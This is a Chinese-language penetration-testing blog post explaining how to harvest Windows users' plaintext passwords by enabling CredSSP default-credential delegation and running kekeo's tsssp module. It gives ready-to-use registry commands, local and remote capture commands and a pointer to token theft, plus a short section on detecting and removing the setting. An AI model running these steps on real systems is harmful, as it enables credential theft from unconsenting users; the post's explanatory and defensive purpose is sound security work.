---
layout: post
title: 渗透技巧——通过CredSSP导出用户的明文口令
---


## 0x00 前言
---

在渗透测试中，为了获得Windows系统中的用户口令，通常会选择读取lsass进程的内存。这种方法不仅需要获得系统的管理员权限，而且在更多情况下需要绕过系统对lsass进程的保护。

我在之前的文章[《Windows下的密码hash——Net-NTLMv1介绍》](https://3gstudent.github.io/3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-Net-NTLMv1%E4%BB%8B%E7%BB%8D/)曾介绍过使用[InternalMonologue](https://github.com/eladshamir/Internal-Monologue)获得当前用户凭据的方法(通过SSPI调用对NTLM身份验证包(MSV1_0)的本地过程调用，以计算出NetNTLM响应)，不需要对lsass进程操作。

本文将要介绍另外一种获得当前用户口令的方法，同样不需要对lsass进程操作。

这是Benjamin @gentilkiwi Delpy开源的[kekeo](https://github.com/gentilkiwi/kekeo)在2018年添加的功能，只需要修改Windows系统的组策略，就能够以普通用户的权限获得用户的明文口令。

本文将要对其中的原理进行简要介绍，分析不同环境下的利用思路，给出防御建议。

## 0x01 简介
---

本文将要介绍以下内容：

- 实现原理
- 实现方法
- 利用分析
- 防御检测

## 0x02 实现原理
---

### 1.基础知识

#### CredSSP

全称Credential Security Support Provider protocol

CredSSP协议的目的是将用户的明文密码从CredSSP客户端委派给CredSSP服务器

CredSSP通常应用于远程桌面服务(Remote Desktop Protocol)和Windows远程管理(Windows Remote Management)（例如Powershell Remoting）

CredSSP提供了加密的传输层安全协议通道。协商协议使用Kerberos和NTLM

参考资料：

https://docs.microsoft.com/en-us/windows/win32/secauthn/credential-security-support-provider

### 2.通过组策略设置CredSSP的凭据分配

通过组策略可以指定使用CredSSP组件的应用程序是否发送默认凭据

组策略位置：`Computer Configuration`->`Administrative Templates`->`System`->`Credentials Delegation`

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-8-6/2-1.PNG)

`Allow delegating default credentials`表示在通过使用受信任的X509证书或Kerberos实现服务器身份验证时自动发送当前用户的凭据

`Allow delegating default credentials with NTLM-only server authentication`表示在通过NTLM实现服务器身份验证时自动发送当前用户的凭据

组策略对应的注册表位置:`HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation`

### 3.CredSSP的凭据分配在远程桌面服务上的应用

对于工作组环境，需要启用`Allow delegating default credentials with NTLM-only server authentication`

对于域环境，需要启用`Allow delegating default credentials`

开启对应的组策略后，在使用远程桌面连接时，会自动发送当前用户的凭据(明文格式，不是hash)

数据结构如下：

```
TSPasswordCreds ::= SEQUENCE {
         domainName  [0] OCTET STRING,
         userName    [1] OCTET STRING,
         password    [2] OCTET STRING
 }
```

参考资料：

https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-cssp/17773cc4-21e9-4a75-a0dd-72706b174fe5

### 4.实现原理

综上，如果我们实现以下操作：

- 修改主机A的组策略，设置为自动发送当前用户的凭据
- 在主机B上面实现服务端的功能，接收主机A发送的请求

那么当我们控制主机A连接主机B时，主机B就能够获得主机A用户的明文口令

CredSSP协议细节可参考：

https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-cssp/85f57821-40bb-46aa-bfcb-ba9590b8fc30

更近一步，如果我们实现以下操作：

- 修改主机A的组策略，设置为自动发送当前用户的凭据
- 在主机A上面实现服务端的功能，接收主机A自己发送的请求

我们同样能够获得用户的明文口令

**注：**

keko的实现方式是通过SMB协议创建命名管道，而不是RDP协议

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-8-6/2-2.PNG)

## 0x03 实现方法
---

通过修改注册表的方式添加组策略，命令如下：

```
reg add hklm\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation /v AllowDefaultCredentials /t REG_DWORD /d 1
reg add hklm\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation /v AllowDefCredentialsWhenNTLMOnly /t REG_DWORD /d 1
reg add hklm\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation /v ConcatenateDefaults_AllowDefault /t REG_DWORD /d 1
reg add hklm\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation /v ConcatenateDefaults_AllowDefNTLMOnly /t REG_DWORD /d 1
reg add hklm\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation\AllowDefaultCredentials /v 1 /t REG_SZ /d *
reg add hklm\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation\AllowDefCredentialsWhenNTLMOnly /v 1 /t REG_SZ /d *
```

添加组策略后，需要等待用户重新登录并输入凭据后才能生效，例如锁屏、注销或重启等

对于不同的网络环境，实现方法存在差异

### 1.工作组网络

身份验证方式为NTLM

#### (1)抓取本机口令

建立服务器的kekeo命令如下(普通用户权限)：

```
tsssp::server
```

连接服务器的kekeo命令如下(普通用户权限)：

```
tsssp::client /target:anyword
```

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-8-6/3-1.PNG)

**注：**

抓取本机口令时，`target`参数可以设置为任意字符

### 2.域网络

身份验证方式为Kerberos

#### (1)抓取本机口令

建立服务器的kekeo命令如下(普通用户权限)：

```
tsssp::server
```

连接服务器的kekeo命令如下(普通用户权限)：

```
tsssp::client /target:anyword
```

**注：**

抓取本机口令时，`target`参数可以设置为任意字符

#### (2)抓取远程主机口令

建立服务器的kekeo命令如下(System权限)：

```
tsssp::server
```

连接服务器的kekeo命令如下(普通用户权限)：

```
tsssp::client /target:TERMSRV/COMPUTER01.test.com /pipe:\\COMPUTER01.test.com\pipe\kekeo_tsssp_endpoint
```

结果如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-8-6/3-2.PNG)

这里使用的参数为域内计算机帐户对应的SPN

查看当前域内的所有SPN可以使用setspn命令：

```
setspn.exe -q */*
```

查看test域内的所有SPN：

```
setspn.exe -T test -q */*
```

## 0x04 利用分析
---

### 1.优点

不需要同lsass进程交互，所以能够绕过对lsass进程的保护

在修改组策略后，只需要普通用户权限就能实现

**注：**

添加组策略后，需要等待用户重新登录并输入凭据后才能生效，例如锁屏、注销或重启等

### 2.其他利用思路

#### (1)代码的提取

我将kekeo的`tsssp::client`功能单独提取出来，地址如下：

https://github.com/3gstudent/Homework-of-C-Language/blob/master/tsssp_client.cpp

代码支持连接本地和远程服务器

只需要填写pipi参数，我的代码会将target参数自动补全为`TERMSRV/<spn>`

连接本地的命令示例:

```
tsssp_client.exe localhost
```

测试如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-8-6/4-1.PNG)

连接远程服务器的命令示例:

```
tsssp_client.exe Computer01.test.com
```

测试如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-8-6/4-2.PNG)

kekeo的`tsssp::server`功能需要安装[OSS ASN.1/C](http://www.oss.com/asn1/products/asn1-c/asn1-c.html)

**注：**

使用试用版的OSS ASN.1/C编译生成的exe文件无法在未安装OSS ASN.1/C的系统下使用

#### (2)抓取其他用户的口令

使用其他用户的token启动kekeo.exe或者tsssp_client.exe即可

token的利用方法可参考[《渗透技巧——Token窃取与利用》](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Token%E7%AA%83%E5%8F%96%E4%B8%8E%E5%88%A9%E7%94%A8/)

## 0x05 防御检测
---

1.查询组策略配置

查询注册表的cmd命令如下：

```
reg query hklm\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation
```

2.删除组策略配置

删除注册表项的cmd命令如下：

```
reg delete hklm\SOFTWARE\Policies\Microsoft\Windows\CredentialsDelegation /f
```

## 0x06 小结
---

本文介绍了[kekeo](https://github.com/gentilkiwi/kekeo)的`tsssp`模块在不同环境下的利用方法，结合利用思路给出防御建议。



---


[LEAVE A REPLY](https://github.com/3gstudent/feedback/issues/new)






